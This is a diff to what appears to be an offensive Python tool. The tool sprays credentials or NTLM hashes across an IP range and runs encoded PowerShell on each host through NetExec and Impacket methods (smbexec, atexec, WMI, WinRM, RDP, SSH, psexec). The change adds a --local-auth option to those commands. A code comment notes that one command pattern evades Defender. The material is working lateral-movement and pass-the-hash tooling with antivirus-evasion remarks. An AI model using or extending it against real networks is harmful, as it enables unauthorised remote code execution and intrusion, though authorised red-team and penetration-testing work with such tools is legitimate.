@@ -20,6 +20,7 @@ RUN_ALL = False
 SKIP_PORTSCAN = False
 TOOLS_SPECIFIED = False
 LINUX_MODE = False
+LOCAL_AUTH = False
 
 VALID_TOOLS = ["winrm", "smbexec", "wmi", "ssh", "mssql", "psexec", "atexec", "rdp"]
 NXC_TOOLS = {"smbexec", "ssh", "wmi", "rdp", "winrm", "winrm-ssl", "atexec"}
@@ -191,6 +192,7 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
     
     # For nxc tools, add --no-output unless -o was passed
     nxc_output_flag = "" if OUTPUT else " --no-output"
+    nxc_local_auth_flag = " --local-auth" if LOCAL_AUTH else ""
 
     # Impacket tools
     if tool == "psexec":
@@ -207,21 +209,21 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
 
     # NXC tools
     if tool == "smbexec":
-        return (f"{NXC_CMD} smb {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}"
+        return (f"{NXC_CMD} smb {target} -H {hash_val} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}{nxc_local_auth_flag}"
                 if use_hash else
-                f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}")
+                f"{NXC_CMD} smb {target} -p {credential} -u \"{user}\" -X 'powershell -enc {b64}' --exec-method smbexec{nxc_output_flag}{nxc_local_auth_flag}")
 
     if tool == "atexec":
-        return (f"{NXC_CMD} smb {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}' --exec-method atexec{nxc_output_flag}"
+        return (f"{NXC_CMD} smb {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}' --exec-method atexec{nxc_output_flag}{nxc_local_auth_flag}"
                 if use_hash else
-                f"{NXC_CMD} smb {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}' --exec-method atexec{nxc_output_flag}")
+                f"{NXC_CMD} smb {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}' --exec-method atexec{nxc_output_flag}{nxc_local_auth_flag}")
 
     if tool == "wmi":
         # we don't actually need to pass the --no-output here, as defender won't catch it with this specific `cmd /c "powershell -enc` combo
         # additionally, adding --no-output makes it very difficult to differentiate between command execution and a successful authentication w/o execution for wmi specifically
-        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'"
+        return (f"{NXC_CMD} wmi {target} -H {hash_val} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'{nxc_local_auth_flag}"
                 if use_hash else
-                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'")
+                f"{NXC_CMD} wmi {target} -p {credential} -u \"{user}\" -X 'cmd /c \"powershell -enc {b64}\"'{nxc_local_auth_flag}")
 
     if tool == "ssh":
         if LINUX_MODE:
@@ -230,19 +232,19 @@ def build_cmd(tool, user, target, credential, command, use_hash=False):
         return f"{NXC_CMD} ssh {target} -p {credential} -u \"{user}\" -x 'powershell -enc {b64}'{nxc_output_flag}"
 
     if tool == "winrm":
-        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} --check-proto http --port 5985 -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} --check-proto http --port 5985 -X 'powershell -enc {b64}'{nxc_output_flag}{nxc_local_auth_flag}"
                 if use_hash else
-                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} --check-proto http --port 5985 -X 'powershell -enc {b64}'{nxc_output_flag}")
+                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} --check-proto http --port 5985 -X 'powershell -enc {b64}'{nxc_output_flag}{nxc_local_auth_flag}")
 
     if tool == "winrm-ssl":
-        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} --check-proto https --port 5986 -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"{NXC_CMD} winrm {target} -u \"{user}\" -H {hash_val} --check-proto https --port 5986 -X 'powershell -enc {b64}'{nxc_output_flag}{nxc_local_auth_flag}"
                 if use_hash else
-                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} --check-proto https --port 5986 -X 'powershell -enc {b64}'{nxc_output_flag}")
-    
+                f"{NXC_CMD} winrm {target} -u \"{user}\" -p {credential} --check-proto https --port 5986 -X 'powershell -enc {b64}'{nxc_output_flag}{nxc_local_auth_flag}")
+
     if tool == "rdp":
-        return (f"{NXC_CMD} rdp {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}"
+        return (f"{NXC_CMD} rdp {target} -u \"{user}\" -H {hash_val} -X 'powershell -enc {b64}'{nxc_output_flag}{nxc_local_auth_flag}"
                 if use_hash else
-                f"{NXC_CMD} rdp {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}")
+                f"{NXC_CMD} rdp {target} -u \"{user}\" -p {credential} -X 'powershell -enc {b64}'{nxc_output_flag}{nxc_local_auth_flag}")
 
     raise Exception(f"Unknown tool: {tool}")
 
@@ -260,6 +262,9 @@ def run_chain(user, ip, credential, command, use_hash=False, tool_list=None):
         chain = expanded_chain
 
     for tool in chain:
+        if LOCAL_AUTH and tool not in NXC_TOOLS:
+            safe_print(f"  \033[33m[!]\033[0m Note: {tool} does not use --local-auth (impacket handles local auth automatically).")
+
         # Can't pass the hash with SSH
         if tool == "ssh" and use_hash:
             safe_print(f"  [-] Skipping SSH for {ip}: cannot pass the hash.")
@@ -418,6 +423,7 @@ def parse_args():
     parser.add_argument("-f", "--file", metavar="CRED_FILE", help="Credential file (newline-separated user/password or user/hash pairs; hashes auto-detected)")
 
     parser.add_argument("--linux", action="store_true", help="Linux-only mode - automates SSH, ignores other tools")
+    parser.add_argument("--local-auth", action="store_true", help="Authenticate as a local user (passed through to NetExec's --local-auth)")
 
     parser.add_argument("ip_range", help="IP range (e.g., 192.168.1.1-254)")
     parser.add_argument("-u", "--user", metavar="USERNAME", help="Username")
@@ -487,7 +493,7 @@ def impacket_cmd(tool):
     return f"{tool}.py"
 
 def main():
-    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN, TOOLS_SPECIFIED, LINUX_MODE
+    global VERBOSE, OUTPUT, MAX_THREADS, EXEC_TIMEOUT, RUN_ALL, SKIP_PORTSCAN, TOOLS_SPECIFIED, LINUX_MODE, LOCAL_AUTH
 
     args = parse_args()
 
@@ -497,6 +503,7 @@ def main():
     RUN_ALL = args.run_all
     SKIP_PORTSCAN = args.skip_portscan
     LINUX_MODE = args.linux
+    LOCAL_AUTH = args.local_auth
 
     check_dependencies()
 
